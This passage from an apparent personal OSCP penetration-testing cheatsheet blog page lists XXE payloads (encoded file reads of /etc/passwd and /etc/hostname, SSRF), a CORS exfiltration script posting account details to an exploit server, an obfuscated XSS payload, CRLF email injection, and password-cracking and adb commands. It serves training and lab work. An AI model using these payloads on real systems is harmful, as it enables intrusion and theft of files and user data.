+	<br>#XInclude attacks<br>productId=&#x3c;&#x66;&#x6f;&#x6f;&#x20;&#x78;&#x6d;&#x6c;&#x6e;&#x73;&#x3a;&#x78;&#x69;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x77;&#x33;&#x2e;&#x6f;&#x72;&#x67;&#x2f;&#x32;&#x30;&#x30;&#x31;&#x2f;&#x58;&#x49;&#x6e;&#x63;&#x6c;&#x75;&#x64;&#x65;&#x22;&#x3e;&#x0a;&#x3c;&#x78;&#x69;&#x3a;&#x69;&#x6e;&#x63;&#x6c;&#x75;&#x64;&#x65;&#x20;&#x70;&#x61;&#x72;&#x73;&#x65;&#x3d;&#x22;&#x74;&#x65;&#x78;&#x74;&#x22;&#x20;&#x68;&#x72;&#x65;&#x66;&#x3d;&#x22;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x65;&#x74;&#x63;&#x2f;&#x70;&#x61;&#x73;&#x73;&#x77;&#x64;&#x22;&#x2f;&#x3e;&#x3c;&#x2f;&#x66;&#x6f;&#x6f;&#x3e;
+	<br>#exploit via image file upload: Create a local SVG image with the following content -> upload -> see the contents of the /etc/hostname file in the image:<br>&#x3c;&#x3f;&#x78;&#x6d;&#x6c;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x31;&#x2e;&#x30;&#x22;&#x20;&#x73;&#x74;&#x61;&#x6e;&#x64;&#x61;&#x6c;&#x6f;&#x6e;&#x65;&#x3d;&#x22;&#x79;&#x65;&#x73;&#x22;&#x3f;&#x3e;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x74;&#x65;&#x73;&#x74;&#x20;&#x5b;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x78;&#x78;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x66;&#x69;&#x6c;&#x65;&#x3a;&#x2f;&#x2f;&#x2f;&#x65;&#x74;&#x63;&#x2f;&#x68;&#x6f;&#x73;&#x74;&#x6e;&#x61;&#x6d;&#x65;&#x22;&#x20;&#x3e;&#x20;&#x5d;&#x3e;&#x3c;&#x73;&#x76;&#x67;&#x20;&#x77;&#x69;&#x64;&#x74;&#x68;&#x3d;&#x22;&#x31;&#x32;&#x38;&#x70;&#x78;&#x22;&#x20;&#x68;&#x65;&#x69;&#x67;&#x68;&#x74;&#x3d;&#x22;&#x31;&#x32;&#x38;&#x70;&#x78;&#x22;&#x20;&#x78;&#x6d;&#x6c;&#x6e;&#x73;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x77;&#x33;&#x2e;&#x6f;&#x72;&#x67;&#x2f;&#x32;&#x30;&#x30;&#x30;&#x2f;&#x73;&#x76;&#x67;&#x22;&#x20;&#x78;&#x6d;&#x6c;&#x6e;&#x73;&#x3a;&#x78;&#x6c;&#x69;&#x6e;&#x6b;&#x3d;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x77;&#x77;&#x77;&#x2e;&#x77;&#x33;&#x2e;&#x6f;&#x72;&#x67;&#x2f;&#x31;&#x39;&#x39;&#x39;&#x2f;&#x78;&#x6c;&#x69;&#x6e;&#x6b;&#x22;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x31;&#x2e;&#x31;&#x22;&#x3e;&#x3c;&#x74;&#x65;&#x78;&#x74;&#x20;&#x66;&#x6f;&#x6e;&#x74;&#x2d;&#x73;&#x69;&#x7a;&#x65;&#x3d;&#x22;&#x31;&#x36;&#x22;&#x20;&#x78;&#x3d;&#x22;&#x30;&#x22;&#x20;&#x79;&#x3d;&#x22;&#x31;&#x36;&#x22;&#x3e;&#x26;&#x78;&#x78;&#x65;&#x3b;&#x3c;&#x2f;&#x74;&#x65;&#x78;&#x74;&#x3e;&#x3c;&#x2f;&#x73;&#x76;&#x67;&#x3e;&#x0a;
+	</li>
+	<li>-> <b>SSRF:</b><br>&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x66;&#x6f;&#x6f;&#x20;&#x5b;&#x20;&#x3c;&#x21;&#x45;&#x4e;&#x54;&#x49;&#x54;&#x59;&#x20;&#x78;&#x78;&#x65;&#x20;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4d;&#x20;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3a;&#x2f;&#x2f;&#x69;&#x6e;&#x74;&#x65;&#x72;&#x6e;&#x61;&#x6c;&#x2e;&#x76;&#x75;&#x6c;&#x6e;&#x65;&#x72;&#x61;&#x62;&#x6c;&#x65;&#x2d;&#x77;&#x65;&#x62;&#x73;&#x69;&#x74;&#x65;&#x2e;&#x63;&#x6f;&#x6d;&#x2f;&#x22;&#x3e;&#x20;&#x5d;&#x3e;&#x0a; </li>
+	<li>-> <b>Exfiltrate data out-of-band (blind):</b> </li>
+	<li>-> <b>Retrieve data via error messages (blind):</b> </li>
+	<li>XXE attacks via modified content type:<br>#Normal:<br>
+POST /action HTTP/1.0<br>
+Content-Type: <strong>application/x-www-form-urlencoded</strong><br>
+Content-Length: 7<br><br>
+
+<strong>foo=bar</strong><br><br>
+#Modified:<br>
+POST /action HTTP/1.0<br>
+Content-Type: <strong>text/xml</strong><br>
+Content-Length: 52<br><br>
+
+<strong>&#x3c;&#x3f;&#x78;&#x6d;&#x6c;&#x20;&#x76;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x22;&#x31;&#x2e;&#x30;&#x22;&#x20;&#x65;&#x6e;&#x63;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#x3d;&#x22;&#x55;&#x54;&#x46;&#x2d;&#x38;&#x22;&#x3f;&#x3e;&#x3c;&#x66;&#x6f;&#x6f;&#x3e;&#x62;&#x61;&#x72;&#x3c;&#x2f;&#x66;&#x6f;&#x6f;&#x3e;</strong>
+	</li>
+</ul>
+</code></pre></div></div>
+
+<h3 id="cors">CORS Exploitation</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Exfil sensitive data: Craft exploit server
+&lt;script&gt;
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open(&#39;get&#39;,&#39;YOUR-LAB-ID.web-security-academy.net/accountDetails&#39;,true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location=&#39;/log?key=&#39;+this.responseText;
+    };
+&lt;/script&gt;
+</code></pre></div></div>
+
+<h3 id="websocket">WebSocket</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#obfuscated XSS payload
+&lt;img src=1 oNeRrOr=alert`1`&gt;
+</code></pre></div></div>
+
+<h2 id="email">Email sending checklist (inquiry)</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#Check for sensitive information in email content:
+	- Phone
+	- Address
+#Manipulate email body by %0d%0a
+
+###Other MBSD notes:
+○ Output of unnecessary information (server version information), but in general cases, the following does not need to be reported
+Apache Coyote Server: Apache-Coyote / 1.1
+Java Servelt X-Powered-By: Servlet / 2.5 JSP / 2.1
+Microsoft-IIS Server: Microsoft-IIS / 7.5
+Microsoft-HTTPAPI / 2.0
+ASP.NET X-AspNetMvc-Version: 5.2
+Microsoft-HTTPAPI Server: Microsoft-HTTPAPI / 2.0
+Application Request Routing X-Powered-By: ARR / 2.5
+AWS ELB awselb / 2.0
+JSF X-Powered-By: JSF / 1.2
+Drupal X-Generator: Drupal 7 (http://drupal.org)
+</code></pre></div></div>
+<hr>
+<h2 id="forensic">Forensic</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>binwalk -e image.png
+cd _image.png 		#(use tab) this really blowed my mind
+zip2john file.zip > forJohn.txt
+
+steghide extract -sf image.jpg
+(enter passphrase)
+stegcracker image.jpg ~/Workspace/THM/wordlists/rockyou.txt
+
+exiftool image.png
+strings image.png
+
+#edit file signature
+xxd -r -p -o OFFSET <(echo NEW HEX SIGNATURE) FILE
+i.e: convert a file to png
+xxd -r -p -o 0 <(echo 8950 4e47 0d0a 1a0a) file.extension
+
+https://aperisolve.fr/
+</code></pre></div></div>
+<hr>
+<h2 id="printer-hacking">Printer hacking</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://tryhackme.com/room/printerhacking101
+http://hacking-printers.net/wiki/index.php/Printer_Security_Testing_Cheat_Sheet
+https://github.com/RUB-NDS/PRET
+</code></pre></div></div>		
+<hr>
+<h2 id="mobile-pentest">Mobile Pentest</h2>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Download adb for Windows: https://dl.google.com/android/repository/platform-tools_r33.0.1-windows.zip
+
+#Set hosts file: (#for Nox player: https://www.bignox.com/blog/how-to-connect-android-studio-with-nox-app-player-for-android-development-and-debug/)
+	(enable USB debugging setting > adb connect 127.0.0.1:62001 #forNox | :21503 #forMemu)
+	adb root
+	adb remount
+	adb pull /system/etc/hosts hosts
+		...edit hosts file and push back...
+	adb push hosts /system/etc/hosts
+
+#Add burp cert to root cert:
+	(adb)
+	or install Root Certificat Manager
+
+#View log:
+	adb logcat
+</code></pre></div></div>
+<h4 id="mobile-pentest-process">Process</h4>	  
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><img src="D:\Workspace\2022\OSCP\OSCP personal cheatsheet_files\Workflow.jpg">
+</code></pre></div></div>
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="https://liodeus.github.io/tags.html#OSCP-ref">
+					OSCP <span>(30)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="https://liodeus.github.io/tags.html#Cheatsheet-ref">
+					Cheatsheet <span>(5)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+</div>
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="https://twitter.com/intent/tweet?text=Write-up%20from%20Liodeus%20on%20OSCP%20personal%20cheatsheet%20:%20https://liodeus.github.io/2020/09/18/OSCP-personal-cheatsheet.html&amp;hashtags=OSCP,Cheatsheet," onclick="window.open(this.href, &#39;twitter-share&#39;, &#39;width=550,height=235&#39;);return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php" onclick="window.open(this.href, &#39;facebook-share&#39;,&#39;width=580,height=296&#39;);return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus" onclick="window.open(&#39;https://plus.google.com/share?url=&#39;+window.location.href, &#39;google-plus-share&#39;, &#39;width=490,height=530&#39;);return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="https://liodeus.github.io/2020/08/11/bufferOverflow.html" title="Buffer Overflow personal cheatsheet">← Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="https://liodeus.github.io/2020/10/19/OSCP-exam-report-training.html" title="OSCP exam report - training">Next →</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr>
+			<p>
+				© 2022 Dane.
+			</p>
+		</footer>
+	</div>
+
+	<script async="" src="./OSCP personal cheatsheet_files/analytics.js.download"></script><script type="text/javascript" src="./OSCP personal cheatsheet_files/jquery.min.js.download"></script>
+	<script type="text/javascript" src="./OSCP personal cheatsheet_files/bootstrap.min.js.download"></script>
+	<script type="text/javascript" src="./OSCP personal cheatsheet_files/app.js.download"></script>
+
+
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'Liodeus', 'auto');
+  ga('send', 'pageview');
+</script>
+
+</body><grammarly-desktop-integration data-grammarly-shadow-root="true"></grammarly-desktop-integration></html>
